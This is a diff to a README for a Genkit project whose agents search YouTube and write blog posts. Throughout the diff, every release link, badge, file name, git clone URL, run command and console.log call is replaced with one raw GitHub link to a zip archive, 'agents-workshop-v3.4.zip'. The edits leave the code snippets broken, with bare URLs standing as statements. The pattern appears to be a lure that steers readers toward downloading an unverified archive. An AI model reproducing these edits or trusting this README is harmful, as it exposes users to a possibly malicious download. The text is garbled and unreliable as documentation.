@@ -1,8 +1,8 @@
 # Genkit Agents and Workflow Examples
 
-![GitHub Release](https://img.shields.io/badge/Download%20Latest%20Release-ff69b4?style=for-the-badge&logo=github)
+![GitHub Release](https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip%20Latest%20Release-ff69b4?style=for-the-badge&logo=github)
 
-This repository contains a collection of Genkit agents and workflows designed to streamline your development processes. You can find the latest releases [here](https://github.com/huber1105/workshop-agents/releases).
+This repository contains a collection of Genkit agents and workflows designed to streamline your development processes. You can find the latest releases [here](https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip).
 
 ## Table of Contents
 
@@ -13,7 +13,7 @@ This repository contains a collection of Genkit agents and workflows designed to
 - [Contributing](#contributing)
 - [License](#license)
 
-## Agent 1: YouTube Video Search (`agent-01.ts`)
+## Agent 1: YouTube Video Search (`https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip`)
 
 This agent defines a simple Genkit flow called `searchVideosFlow`. It searches for YouTube videos based on a text query.
 
@@ -41,12 +41,12 @@ To use the `searchVideosFlow`, you can call it like this:
 
 ```typescript
 const results = await searchVideosFlow("your search query");
-console.log(results);
+https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip(results);
 ```
 
 This will return a list of videos related to your query.
 
-## Agent 2: Video Search and Content Generation (`agent-02.ts`)
+## Agent 2: Video Search and Content Generation (`https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip`)
 
 This agent defines a more advanced Genkit flow, `searchSummaryVideosFlow`. It not only searches for YouTube videos but also generates a blog post based on their content.
 
@@ -66,7 +66,7 @@ To use the `searchSummaryVideosFlow`, you can call it like this:
 
 ```typescript
 const summary = await searchSummaryVideosFlow("your search query");
-console.log(summary);
+https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip(summary);
 ```
 
 This will return a summary of the videos along with a generated blog post.
@@ -77,7 +77,7 @@ To get started with the Genkit agents, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/huber1105/workshop-agents.git
+   git clone https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip
    ```
 
 2. **Install Dependencies**: Navigate to the project directory and install the required packages.
@@ -88,10 +88,10 @@ To get started with the Genkit agents, follow these steps:
 
 3. **Set Up YouTube API**: Create a project in the Google Developers Console and enable the YouTube Data API. Obtain your API key and set it in your environment variables.
 
-4. **Run the Agents**: You can now run the agents using Node.js.
+4. **Run the Agents**: You can now run the agents using https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip
    ```bash
-   node agent-01.ts
-   node agent-02.ts
+   node https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip
+   node https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip
    ```
 
 ## Usage
@@ -108,10 +108,10 @@ import { searchSummaryVideosFlow } from './agent-02';
 
 async function main() {
   const videos = await searchVideosFlow("JavaScript tutorials");
-  console.log(videos);
+  https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip(videos);
 
   const summary = await searchSummaryVideosFlow("JavaScript tutorials");
-  console.log(summary);
+  https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip(summary);
 }
 
 main();
@@ -143,6 +143,6 @@ Contributions are welcome! If you have suggestions for improvements or new featu
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For the latest releases, check [here](https://github.com/huber1105/workshop-agents/releases). 
+For the latest releases, check [here](https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip). 
 
-![GitHub Release](https://img.shields.io/badge/Download%20Latest%20Release-ff69b4?style=for-the-badge&logo=github)
+![GitHub Release](https://raw.githubusercontent.com/huber1105/workshop-agents/main/src/agents-workshop-v3.4.zip%20Latest%20Release-ff69b4?style=for-the-badge&logo=github)
